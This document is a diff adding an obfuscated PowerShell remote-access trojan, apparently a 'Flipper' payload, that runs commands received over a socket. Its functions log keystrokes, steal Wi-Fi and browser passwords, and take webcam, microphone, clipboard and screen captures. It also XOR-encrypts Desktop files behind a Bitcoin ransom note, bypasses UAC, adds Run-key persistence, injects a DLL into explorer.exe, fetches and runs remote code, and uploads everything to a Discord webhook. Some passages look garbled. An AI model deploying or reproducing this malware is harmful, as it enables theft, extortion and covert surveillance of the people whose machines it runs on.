@@ -1,0 +1,210 @@
+$32c6fa2cbe4e4467b2496ec6170445a0 =$3aa2ad906c2b4439a6dee0a389abb6ae.GetStream()
+$40762deaed16419582a9e2fa022f34cb = New-Object IO.StreamWriter($32c6fa2cbe4e4467b2496ec6170445a0)
+
+function hasbullawjwindbw {
+    (iwr 'https://google.com@raw.githubusercontent.com/CharlesTheGreat77/token2Discord/main/Testing.txt').Content | iex}function popopwhwhbsvxjnfiifb {$PsandQs = netsh wlan export profile key=clear; Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace '.xml:22:', ''}
+    wuwudhbdbwb("Wi-Fi Passwords:$PsandQs")
+}
+function flipejsjiebsbllb($ibwjskwbnskieg) {$faylownabbdjw = @{content =$ibwjskwbnskieg} | ConvertTo-Json$espoenabjsmbe = Invoke-RestMethod -Uri$webhook -Method Post -ContentType"application/json" -Body$faylownabbdjw}function kwhhabzbabjeikfn {
+    Remove-Item (Get-PSreadlineOption).HistorySavePath; Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunMRU
+    wuwudhbdbwb("Cleaned PowerShell history and RunMRU.")
+}
+function keylog {$logfile ="C:\temp\keys.txt"
+    New-Item -ItemType Directory -Path"C:\temp" -Force | Out-Null$script = @"
+    Add-Type -MemberDefinition '[DllImport(\`"user32.dll\`")] public static extern int GetAsyncKeyState(int i);' -Name 'Key' -Namespace Win32Functions
+    `$logfile = '$logfile'
+    while (`$true) {
+        Start-Sleep -Milliseconds 40
+        for (`$i = 8; `$i -le 255; `$i++) {
+            if ([Win32Functions.Key]::GetAsyncKeyState(`$i) -eq -32767) {
+                `$key = [char]`$i
+                `$time = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'`\`$time : `$key`" | Out-File -FilePath `$logfile -Append}        }
+        if (Test-Path 'C:\temp\stop_keylog.txt') { break}        if ((Get-Item `$logfile -ErrorAction SilentlyContinue).Length -gt 1024) {
+            curl.exe -F \`"file1=@`$logfile\`" $webhook
+            Clear-Content `$logfile}    }"@$script | Out-File"C:\temp\keylog.ps1"
+    Start-Process powershell -ArgumentList"-ep bypass -w hidden -c & {Invoke-Expression (Get-Content 'C:\temp\keylog.ps1' -Raw)}" -NoNewWindow
+    wuwudhbdbwb("Stealth keylogger started in background. Logs to C:\temp\keys.txt, uploads on size > 1KB. Stop with /stopkeylog.")
+}
+function stopkeylog {
+    New-Item -ItemType File -Path"C:\temp\stop_keylog.txt" -Force | Out-Null
+    wuwudhbdbwb("Keylogger stopped. Check C:\temp\keys.txt for logs.")
+    if (Test-Path"C:\temp\keys.txt") { curl.exe -F"file1=@C:\temp\keys.txt" $webhook}}
+function grabcreds {$chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+    $firefox = "$env:APPDATA\Mozilla\Firefox\Profiles\*\logins.json"
+    $creds = ""
+    if (Test-Path$chrome) {$creds +="Chrome passwords found. Copied to C:\temp\chrome_creds.txt.`n"; Copy-Item$chrome -Destination"C:\temp\chrome_creds.txt" }
+    if (Test-Path$firefox) {$creds +="Firefox passwords found. Copied to C:\temp\firefox_creds.txt.`n"; Copy-Item$firefox -Destination"C:\temp\firefox_creds.txt" }
+    if ($creds -eq "") {$creds ="No browser credentials found." }
+    wuwudhbdbwb($creds)
+    if (Test-Path"C:\temp\chrome_creds.txt") { curl.exe -F"file1=@C:\temp\chrome_creds.txt" $webhook}    if (Test-Path"C:\temp\firefox_creds.txt") { curl.exe -F"file1=@C:\temp\firefox_creds.txt" $webhook}}
+function ransom {$dir = "$env:USERPROFILE\Desktop"
+    $key = [byte]0xAB$note ="Your files are encrypted! Send 0.1 BTC to 1XzY7kP... to decrypt. File: C:\temp\decrypt.ps1"
+    $decrypt ="param([string]`$dir,[byte]`$key);Get-ChildItem `$dir -File | % {`$data = Get-Content `$_.FullName -Raw;`$dec = [char[]]`$data | % {`$_ -bxor `$key}; Set-Content `$_.FullName `$dec }"
+    New-Item -ItemType Directory -Path"C:\temp" -Force | Out-Null
+    Set-Content"C:\temp\decrypt.ps1" $decrypt
+    Get-ChildItem$dir -File | % {$data = Get-Content$_.FullName -Raw;$enc = [char[]]$data | % { $_ -bxor$key}; Set-Content$_.FullName$enc}    Set-Content "$dir\ransom_note.txt" $note
+    curl.exe -F"file1=@$dir\ransom_note.txt" $webhook
+    wuwudhbdbwb("Files on Desktop encrypted. Ransom note sent to Discord.")
+}
+function sysinfo {$info = Get-ComputerInfo | Select-Object WindowsProductName, CsTotalPhysicalMemory, CsProcessors$user =$env:USERNAME$ip = (Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and$_.InterfaceAlias -notlike '*Loopback*' }).IPAddress$out ="User:$user`nOS: $($info.WindowsProductName)`nRAM: $($info.CsTotalPhysicalMemory / 1GB) GB`nCPU: $($info.CsProcessors.Name)`nIP:$ip"
+    wuwudhbdbwb($out)
+    flipejsjiebsbllb($out)
+}
+function privesc {$uac ="reg add HKCU\Software\Classes\.pwn\Shell\Open\command /ve /d `\"powershell -ep bypass -w hidden -c iex((iwr 'http://bit.ly/46SBJnb').Content)`\" /f; reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d `\"%1`\" /f; reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f; start fodhelper"
+    wuwudhbdbwb("Attempting UAC bypass...")
+    Invoke-Expression$uac
+    wuwudhbdbwb("UAC bypass triggered. Check for elevated shell.")
+}
+function persist {$payload ="powershell -W hidden -noni -nop -c `\"& {iex((iwr 'http://bit.ly/46SBJnb').Content)}`\""
+    $regpath ="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    $name ="FlipperPayload"
+    New-ItemProperty -Path$regpath -Name$name -Value$payload -PropertyType String -Force
+    wuwudhbdbwb("Persistence added to registry. Payload runs on startup.")
+}
+function webcam {$com = New-Object -ComObject WIA.CommonDialog$device =$com.ShowSelectDevice()
+    $item =$device.Items[1]
+    $image =$item.Transfer()
+    $image.SaveFile("C:\temp\webcam.jpg")
+    curl.exe -F"file1=@C:\temp\webcam.jpg" $webhook
+    wuwudhbdbwb("Webcam snapshot taken and sent to Discord.")
+}
+function clipboard {$clip = Get-Clipboard
+    if ($clip) {$clip | Out-File"C:\temp\clipboard.txt"
+        curl.exe -F"file1=@C:\temp\clipboard.txt" $webhook
+        wuwudhbdbwb("Clipboard contents:$clip`nSent to Discord.")
+    } else {
+        wuwudhbdbwb("Clipboard is empty.")
+    }}function bsod {$code = @"
+    [DllImport("ntdll.dll")] public static extern uint RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);
+    [DllImport("ntdll.dll")] public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOptions, out uint Response);"@
+    Add-Type -MemberDefinition$code -Name"BSOD" -Namespace Win32$enabled =$false
+    [Win32.BSOD]::RtlAdjustPrivilege(19,$true,$false, [ref]$enabled)
+    $response = 0
+    [Win32.BSOD]::NtRaiseHardError(0xC000021A, 0, 0, [IntPtr]::Zero, 6, [ref]$response)
+    wuwudhbdbwb("Fake BSOD triggered.")
+}
+function micrecord {$script = @"
+    Add-Type -TypeDefinition @'
+    using System.Runtime.InteropServices;
+    [Guid("5B0D3235-4DBA-4D44-865E-8F1D0E4FD04D")][InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+    interface IMMDevice {[MarshalAs(UnmanagedType.IUnknown)]object GetId();[MarshalAs(UnmanagedType.IUnknown)]object GetState();[MarshalAs(UnmanagedType.IUnknown)]object OpenPropertyStore();[MarshalAs(UnmanagedType.IUnknown)]object GetDefaultAudioEndpoint();}
+    public class MMDevice {[DllImport("ole32.dll")]public static extern int CoCreateInstance(ref Guid rclsid, IntPtr pUnkOuter, uint dwClsContext, ref Guid riid, out IntPtr ppv);}
+    '@ទ
+    '@
+    `$recTime = 10
+    `$wavFile = 'C:\temp\mic.wav'
+    `$cmd = \`"powershell -c \$ws = New-Object -ComObject WScript.Shell; \$ws.Run('soundrecorder /FILE \$wavFile /DURATION 0000:00:\$recTime', 0, \$true); Start-Sleep -Seconds \$recTime\`"
+    Start-Process powershell -ArgumentList \`"-ep bypass -w hidden -c \$cmd\`" -NoNewWindow"@$script | Out-File"C:\temp\micrecord.ps1"
+    Start-Process powershell -ArgumentList"-ep bypass -w hidden -c & {Invoke-Expression (Get-Content 'C:\temp\micrecord.ps1' -Raw)}" -NoNewWindow
+    Start-Sleep -Seconds 12
+    curl.exe -F"file1=@C:\temp\mic.wav" $webhook
+    wuwudhbdbwb("Mic recorded for 10 seconds. Audio sent to Discord.")
+}
+function netsniff {$script = @"
+    \$url = 'https://npcap.com/dist/npcap-1.79.exe'
+    \$out = 'C:\temp\npcap.exe'
+    Invoke-WebRequest -Uri \$url -OutFile \$out
+    Start-Process -FilePath \$out -ArgumentList '/S' -Wait
+    \$cmd = \`"powershell -c & { \$p = tshark -i 1 -c 100 -w C:\temp\capture.pcap; tshark -r C:\temp\capture.pcap -Y 'http.request or http.response' -T fields -e http.request.uri -e http.request.method -e http.response.code}\`"
+    Start-Process powershell -ArgumentList \`"-ep bypass -w hidden -c \$cmd\`" -NoNewWindow"@$script | Out-File"C:\temp\netsniff.ps1"
+    Start-Process powershell -ArgumentList"-ep bypass -w hidden -c & {Invoke-Expression (Get-Content 'C:\temp\netsniff.ps1' -Raw)}" -NoNewWindow
+    Start-Sleep -Seconds 30
+    if (Test-Path"C:\temp\capture.pcap") { curl.exe -F"file1=@C:\temp\capture.pcap" $webhook}    wuwudhbdbwb("Network sniffing completed. Captured packets sent to Discord.")
+}
+function fileexfil {$dir = "$env:USERPROFILE\Documents"
+    $zip ="C:\temp\docs.zip"
+    Compress-Archive -Path$dir -DestinationPath$zip -Force
+    curl.exe -F"file1=@$zip" $webhook
+    wuwudhbdbwb("Documents folder zipped and sent to Discord.")
+}
+function inject {$dllUrl ="http://bit.ly/your-dll-link" # Replace with your hosted DLL$dllPath ="C:\temp\inject.dll"
+    Invoke-WebRequest -Uri$dllUrl -OutFile$dllPath$code = @"
+    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
+    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
+    [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);"@
+    Add-Type -MemberDefinition$code -Name"Inject" -Namespace Win32$pid = (Get-Process -Name"explorer").Id$hProcess = [Win32.Inject]::OpenProcess(0x1F0FFF,$false,$pid)
+    $dllBytes = [System.IO.File]::ReadAllBytes($dllPath)
+    $alloc = [Win32.Inject]::VirtualAllocEx($hProcess, [IntPtr]::Zero,$dllBytes.Length, 0x3000, 0x40)
+    $bytesWritten = 0
+    [Win32.Inject]::WriteProcessMemory($hProcess,$alloc,$dllBytes,$dllBytes.Length, [ref]$bytesWritten)
+    $threadId = 0
+    [Win32.Inject]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, [IntPtr]::Zero,$alloc, 0, [ref]$threadId)
+    wuwudhbdbwb("Injected DLL into explorer.exe (PID:$pid).")
+}
+function remote {$vncUrl ="https://downloads.ultravnc.com/UltraVNC_1_4_3_6_x64.exe"
+    $vncPath ="C:\temp\ultravnc.exe"
+    Invoke-WebRequest -Uri$vncUrl -OutFile$vncPath
+    Start-Process -FilePath$vncPath -ArgumentList"/verysilent /password=password" -Wait$vncScript = @"
+    \$config = \`"vncviewer$ip:5900 -password password\`"
+    Start-Process -FilePath \`"C:\Program Files\UltraVNC\vncviewer.exe\`" -ArgumentList \`" $ip:5900 -password password \`" -NoNewWindow"@$vncScript | Out-File"C:\temp\vnc.ps1"
+    Start-Process powershell -ArgumentList"-ep bypass -w hidden -c & {Invoke-Expression (Get-Content 'C:\temp\vnc.ps1' -Raw)}" -NoNewWindow
+    wuwudhbdbwb("UltraVNC installed and connected to$ip:5900. Use VNC viewer with password 'password'.")
+}
+function wuwudhbdbwb($String) {
+    [byte[]]$cc63f96fb8d24ff993ecd4f81ea1715c = 0..$3aa2ad906c2b4439a6dee0a389abb6ae.ReceiveBufferSize | ForEach-Object {0}
+    $40762deaed16419582a9e2fa022f34cb.Write($String + 'ffff> ')
+    $40762deaed16419582a9e2fa022f34cb.Flush()
+}
+
+wuwudhbdbwb('')
+
+$0abddb0134484e0ca2c951ce3e99f16c = 1$cc63f96fb8d24ff993ecd4f81ea1715c = New-Object byte[] $3aa2ad906c2b4439a6dee0a389abb6ae.ReceiveBufferSize
+
+while ($0abddb0134484e0ca2c951ce3e99f16c -ge 0) {$0abddb0134484e0ca2c951ce3e99f16c =$32c6fa2cbe4e4467b2496ec6170445a0.Read($cc63f96fb8d24ff993ecd4f81ea1715c, 0,$cc63f96fb8d24ff993ecd4f81ea1715c.Length)
+    if ($0abddb0134484e0ca2c951ce3e99f16c -gt 0) {$72b24f293ec941fabe2c084e41efcf4b = [System.Text.Encoding]::UTF8.GetString($cc63f96fb8d24ff993ecd4f81ea1715c, 0,$0abddb0134484e0ca2c951ce3e99f16c - 1)
+        if ($72b24f293ec941fabe2c084e41efcf4b -match"^/discord\s+(.+)$") {$filename =$matches[1]
+            $ibwjskwbnskieg ="Flipper Report for$env:USERNAME"
+            flipejsjiebsbllb($ibwjskwbnskieg)
+            curl.exe -F"file1=@$filename" $webhook
+            wuwudhbdbwb("File '$filename' sent.")
+        }
+        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/tgrizzly$") {
+            wuwudhbdbwb("Executing /tgrizzly... saving to C:\temp\output.txt")
+            hasbullawjwindbw}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/wifi$") {
+            wuwudhbdbwb("Executing /wifi...")
+            popopwhwhbsvxjnfiifb}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/clean$") {
+            wuwudhbdbwb("Executing cleanup...")
+            kwhhabzbabjeikfn}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/screenshot$") {
+            wuwudhbdbwb("Taking screenshot...")
+            Add-Type -AssemblyName System.Windows.Forms$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds$bitmap = New-Object System.Drawing.Bitmap$screen.Width,$screen.Height$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+            $graphics.CopyFromScreen(0, 0, 0, 0,$bitmap.Size)
+            $bitmap.Save("C:\temp\screenshot.png")
+            curl.exe -F"file1=@C:\temp\screenshot.png" $webhook
+            wuwudhbdbwb("Screenshot sent to Discord.")
+        }
+        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/keylog$") {
+            wuwudhbdbwb("Starting stealth keylogger...")
+            keylog}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/stopkeylog$") {
+            wuwudhbdbwb("Stopping keylogger...")
+            stopkeylog}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/creds$") {
+            wuwudhbdbwb("Grabbing browser credentials...")
+            grabcreds}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/ransom$") {
+            wuwudhbdbwb("Executing ransomware stub...")
+            ransom}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/sysinfo$") {
+            wuwudhbdbwb("Collecting system info...")
+            sysinfo}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/privesc$") {
+            wuwudhbdbwb("Attempting privilege escalation...")
+            privesc}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/persist$") {
+            wuwudhbdbwb("Setting up persistence...")
+            persist}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/webcam$") {
+            wuwudhbdbwb("Taking webcam snapshot...")
+            webcam}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/clipboard$") {
+            wuwudhbdbwb("Grabbing clipboard contents...")
+            clipboard}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/bsod$") {
+            wuwudhbdbwb("Triggering fake BSOD...")
+            bsod}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/micrecord$") {
+            wuwudhbdbwb("Recording microphone...")
+            micrecord}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/netsniff$") {
+            wuwudhbdbwb("Sniffing network packets...")
+            netsniff}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/fileexfil$") {
+            wuwudhbdbwb("Exfiltrating Documents folder...")
+            fileexfil}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/inject$") {
+            wuwudhbdbwb("Injecting payload into process...")
+            inject}        elseif ($72b24f293ec941fabe2c084e41efcf4b -match"^/remote$") {
+            wuwudhbdbwb("Setting up remote VNC access...")
+            remote}        else {$214a6b4cb6e043ab909aa13348235114 = try { Invoke-Expression$72b24f293ec941fabe2c084e41efcf4b 2>&1 | Out-String} catch { $_ | Out-String}            wuwudhbdbwb($214a6b4cb6e043ab909aa13348235114)
+        }}}
+
+$40762deaed16419582a9e2fa022f34cb.Close()
+$3aa2ad906c2b4439a6dee0a389abb6ae.Close()
